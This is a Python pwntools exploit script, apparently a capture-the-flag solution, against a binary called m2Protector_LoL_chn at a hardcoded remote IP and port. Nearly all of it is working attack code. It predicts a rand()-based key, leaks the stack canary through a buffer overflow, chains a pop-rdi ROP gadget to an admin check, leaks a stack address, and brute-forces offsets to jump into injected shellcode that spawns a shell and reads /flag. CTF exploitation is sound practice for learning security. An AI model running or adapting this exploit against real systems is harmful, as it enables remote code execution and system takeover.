from pwn import *
from ctypes import CDLL

libc = CDLL("libc.so.6")

masterkey = libc.rand() * libc.rand()

log.info(f"masterkey: {hex(masterkey)}")

#context.log_level = 'debug'

for i in range(-0x148, 0x150, 8):
    while True:
        #p = process('./m2Protector_LoL_chn')
        p = remote("211.229.232.98", 20304)

        p.sendafter(b") : ", b"A" * 41) # canary leak
        p.recvuntil("지금 ".encode())
        rd = p.recvn(48 + 6); canary = u64(b"\x00" + rd[41:48])
        log.info(f"canary: {hex(canary)}")

        POP_RDI_GADGET = 0x40129E
        ADMIN_CHECK = 0x401654

        p.sendafter(b") : ", b"skip")

        payload = b"A" * 40 + p64(canary) + b"B" * 8 + p64(POP_RDI_GADGET) + p64(masterkey) + p64(ADMIN_CHECK)
        assert len(payload) == 0x50

        p.sendafter(b") : ", payload)
        p.sendline(b"2")
        p.recvuntil("출력 : \n".encode())

        #context.log_level = 'debug'
        k = p.recv()
        print(k)
        #print(k.decode())
        strange_buffer = u64(k[:6] + b'\x00\x00')
        log.info(f"strange_buffer: {hex(strange_buffer)}")
        print(hex((strange_buffer & 0xFFFF00000000) >> 32))
        if (strange_buffer & 0xFFF000000000) >> 36 != 0x7ff:
            p.close()
            continue

        log.info(f"trying offset {hex(i)}")
        payload = b"A" * 0x18 + p64(canary) + b"B" * 8 + p64(strange_buffer + i)
        assert len(payload) == 0x30

        context.arch = 'amd64'
        context.bits = 64

        payload += asm(shellcraft.sh())
        assert len(payload) <= 0x60

        p.sendline(b"1")
        p.sendafter(b" : ", payload)
        p.sendline(b"3")
        
        try:
            p.sendline(b"cat /flag")
            sleep(1)
            p.recvline()
            p.interactive()
        except EOFError:
            p.close()
            break